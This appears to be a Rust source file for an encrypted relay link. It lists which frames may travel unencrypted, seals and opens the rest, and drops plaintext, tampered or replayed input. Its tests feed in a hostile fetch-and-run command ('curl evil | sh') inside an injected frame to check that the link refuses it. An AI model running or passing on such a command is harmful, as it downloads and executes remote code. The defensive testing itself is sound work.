//! One relay link's envelope: which frames pass in the clear, which are sealed or opened, and
//! what is held or dropped while the handshake is unfinished.
//!
//! Shared by the relay loop (inbound, handshake) and the single writer task (outbound), so the
//! writer is the only place a counter is spent and frames leave in counter order.

use std::collections::VecDeque;

use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD as B64;
use tracing::warn;
use wado_protocol::envelope::{E2eMsg, SEALED_PREFIX};

use super::handshake::{self, Done, Replied};
use super::host_key::HostKey;
use super::seal::{Opener, Sealer};

/// Frames for the relay itself, or the handshake's own: never sealed.
const CLEAR_OUT: &[&str] = &[
    "register",
    "pong",
    "peer_accept",
    "peer_reject",
    "seat_hold",
    "occupancy",
    "e2e_reply",
    "e2e_fail",
];
/// Frames the relay itself originates; everything else from the relay must be sealed.
const CLEAR_IN: &[&str] = &[
    "ping",
    "registered",
    "peer_connected",
    "peer_check",
    "peer_disconnected",
    "error",
];
/// ponytail: a bounded hold for what the daemon says before the handshake finishes (log lines,
/// approval prompts). Past this the oldest go; nothing held is load-bearing.
const HOLD_MAX: usize = 512;

/// Sent through the writer's channel to make it flush what was held.
pub const WAKE: &str = "";

/// The `type` of a JSON frame, read off the prefix every serde/JS writer here produces.
pub fn kind(text: &str) -> Option<&str> {
    let rest = text.strip_prefix(r#"{"type":""#)?;
    Some(&rest[..rest.find('"')?])
}

enum State {
    Waiting,
    Replied(Replied),
    Open { sealer: Sealer, opener: Opener },
    Failed,
}

pub enum Inbound {
    /// A frame from the relay itself; handle it as before.
    Relay,
    /// An opened message from the device.
    Msg(String),
    Hello {
        v: u32,
        eph: String,
    },
    Finish {
        dev_pk: String,
        sig: String,
        pair_mac: String,
    },
    /// Not acted on. Logged by the caller once.
    Drop(&'static str),
}

pub struct Link {
    room: String,
    client_key: String,
    state: State,
    held: VecDeque<String>,
}

impl Default for Link {
    fn default() -> Self {
        Self {
            room: String::new(),
            client_key: String::new(),
            state: State::Failed,
            held: VecDeque::new(),
        }
    }
}

impl Link {
    /// A new device on the seat: nothing it or the old one had carries over.
    pub fn reset(&mut self, room: &str, client_key: &str) {
        *self = Self {
            room: room.into(),
            client_key: client_key.into(),
            state: State::Waiting,
            held: VecDeque::new(),
        };
    }

    /// The device left; nothing more goes to or comes from it.
    pub fn clear(&mut self) {
        *self = Self::default();
    }

    pub fn room(&self) -> &str {
        &self.room
    }

    pub fn is_open(&self) -> bool {
        matches!(self.state, State::Open { .. })
    }

    /// What the writer puts on the wire for one outbound frame, in order.
    pub fn outbound(&mut self, text: String) -> Vec<String> {
        if text != WAKE && kind(&text).is_some_and(|k| CLEAR_OUT.contains(&k)) {
            return vec![text];
        }
        match &mut self.state {
            State::Open { sealer, .. } => {
                let mut out: Vec<String> = Vec::with_capacity(self.held.len() + 1);
                for t in self.held.drain(..).chain((text != WAKE).then_some(text)) {
                    let (n, c) = sealer.seal(t.as_bytes());
                    out.push(
                        serde_json::to_string(&E2eMsg::Sealed {
                            n,
                            c: B64.encode(c),
                        })
                        .expect("serialises"),
                    );
                }
                out
            }
            State::Waiting | State::Replied(_) if text != WAKE => {
                if self.held.len() == HOLD_MAX {
                    self.held.pop_front();
                }
                self.held.push_back(text);
                Vec::new()
            }
            _ => Vec::new(),
        }
    }

    /// Sort one inbound frame.
    pub fn inbound(&mut self, text: &str) -> Inbound {
        let k = kind(text).unwrap_or("");
        if CLEAR_IN.contains(&k) {
            return Inbound::Relay;
        }
        if text.starts_with(SEALED_PREFIX) {
            let State::Open { opener, .. } = &mut self.state else {
                return Inbound::Drop("a sealed frame before the handshake finished");
            };
            let Ok(E2eMsg::Sealed { n, c }) = serde_json::from_str(text) else {
                return self.fail_drop("a malformed sealed frame");
            };
            let Some(plain) = B64.decode(c).ok().and_then(|c| opener.open(n, c)) else {
                return self.fail_drop(
                    "a sealed frame that does not open (tampered, replayed or out of order)",
                );
            };
            return match String::from_utf8(plain) {
                // Sealed is the device speaking; it may not pose as the relay or the handshake.
                Ok(s)
                    if kind(&s).is_some_and(|k| CLEAR_IN.contains(&k) || k.starts_with("e2e_")) =>
                {
                    Inbound::Drop("a sealed frame posing as the relay or the handshake")
                }
                Ok(s) => Inbound::Msg(s),
                Err(_) => self.fail_drop("a sealed frame that is not text"),
            };
        }
        match serde_json::from_str::<E2eMsg>(text) {
            Ok(E2eMsg::E2eHello { v, eph }) => Inbound::Hello { v, eph },
            Ok(E2eMsg::E2eFinish {
                dev_pk,
                sig,
                pair_mac,
            }) => Inbound::Finish {
                dev_pk,
                sig,
                pair_mac,
            },
            _ => Inbound::Drop("a plaintext message from the device side — refused unsealed"),
        }
    }

    fn fail_drop(&mut self, why: &'static str) -> Inbound {
        self.state = State::Failed;
        self.held.clear();
        Inbound::Drop(why)
    }

    /// Answer a hello. `None` when there is nobody to answer (no room, or already open).
    pub fn hello(&mut self, host: &HostKey, v: u32, eph: &str) -> Option<E2eMsg> {
        if self.room.is_empty() || self.is_open() {
            return None;
        }
        match handshake::reply(host, &self.room, &self.client_key, v, eph) {
            Ok((msg, r)) => {
                self.state = State::Replied(r);
                Some(msg)
            }
            Err(e) => {
                warn!("e2e: hello refused — {e}");
                Some(self.fail(e))
            }
        }
    }

    /// Check a finish. The caller decides whether the proven device may in, then calls
    /// [`Link::open`] or [`Link::fail`].
    pub fn finish(
        &mut self,
        dev_pk: &str,
        sig: &str,
        pair_mac: &str,
        pair_codes: &[String],
    ) -> Result<Done, &'static str> {
        let State::Replied(r) = std::mem::replace(&mut self.state, State::Failed) else {
            return Err("a finish without a hello");
        };
        handshake::finish(r, dev_pk, sig, pair_mac, pair_codes)
    }

    /// Let the device in: `e2e_ok` goes first, then whatever was held. The caller wakes the
    /// writer.
    pub fn open(&mut self, sealer: Sealer, opener: Opener) {
        self.state = State::Open { sealer, opener };
        self.held
            .push_front(serde_json::to_string(&E2eMsg::E2eOk).expect("serialises"));
    }

    /// Refuse the device; the returned `e2e_fail` is the last thing it is sent.
    pub fn fail(&mut self, reason: &str) -> E2eMsg {
        self.state = State::Failed;
        self.held.clear();
        E2eMsg::E2eFail {
            reason: reason.into(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::super::handshake::tests::Client;
    use super::*;
    use wado_protocol::envelope::VERSION;

    #[test]
    fn kind_reads_the_tag() {
        assert_eq!(kind(r#"{"type":"pong"}"#), Some("pong"));
        assert_eq!(kind(r#"{"n":1}"#), None);
    }

    /// The hostile-relay cases, against the link as the relay loop drives it.
    #[test]
    fn plaintext_injection_and_tampering_are_refused() {
        let host = HostKey::from_seed(&[5u8; 32]);
        let mut l = Link::default();
        l.reset("room", "ck");
        // Before the handshake, an injected command is refused, and daemon output is held.
        let inject = r#"{"type":"session_launch","command":"curl evil | sh"}"#;
        assert!(matches!(l.inbound(inject), Inbound::Drop(_)));
        assert!(l.outbound(r#"{"type":"log","line":"x"}"#.into()).is_empty());
        // The relay's own frames still pass.
        assert!(matches!(l.inbound(r#"{"type":"ping"}"#), Inbound::Relay));
        assert_eq!(l.outbound(r#"{"type":"pong"}"#.into()).len(), 1);

        let mut c = Client::new();
        let reply = l.hello(&host, VERSION, &B64.encode(&c.eph_pub)).unwrap();
        let ((pk, sig, mac), c2d, d2c) = c.answer("room", "ck", &reply, None);
        let done = l.finish(&pk, &sig, &mac, &[]).unwrap();
        l.open(done.sealer, done.opener);

        // The writer's next frame flushes e2e_ok, then the held log line, in counter order.
        let out = l.outbound(WAKE.into());
        assert_eq!(out.len(), 2);
        let mut o = Opener::new(&d2c);
        for (i, f) in out.iter().enumerate() {
            let Ok(E2eMsg::Sealed { n, c }) = serde_json::from_str(f) else {
                panic!("{f}")
            };
            let p = String::from_utf8(o.open(n, B64.decode(c).unwrap()).unwrap()).unwrap();
            assert_eq!(p.contains("e2e_ok"), i == 0, "{p}");
        }

        // Still refused once open: plaintext is never accepted from the device side.
        assert!(matches!(l.inbound(inject), Inbound::Drop(_)));
        // A sealed frame from the device opens…
        let mut s = Sealer::new(&c2d);
        let frame = |s: &mut Sealer, body: &str| {
            let (n, c) = s.seal(body.as_bytes());
            serde_json::to_string(&E2eMsg::Sealed {
                n,
                c: B64.encode(c),
            })
            .unwrap()
        };
        let f0 = frame(&mut s, r#"{"type":"session_stop"}"#);
        assert!(matches!(l.inbound(&f0), Inbound::Msg(m) if m.contains("session_stop")));
        // A device may not pose as the relay's own events.
        let fake = frame(&mut s, r#"{"type":"peer_connected","room_id":"x"}"#);
        assert!(matches!(l.inbound(&fake), Inbound::Drop(_)));
        // …and a replay closes the link for good.
        assert!(matches!(l.inbound(&f0), Inbound::Drop(_)));
        let f1 = frame(&mut s, r#"{"type":"session_stop"}"#);
        assert!(
            matches!(l.inbound(&f1), Inbound::Drop(_)),
            "failed stays failed"
        );
        assert!(l.outbound(r#"{"type":"log"}"#.into()).is_empty());
    }
}
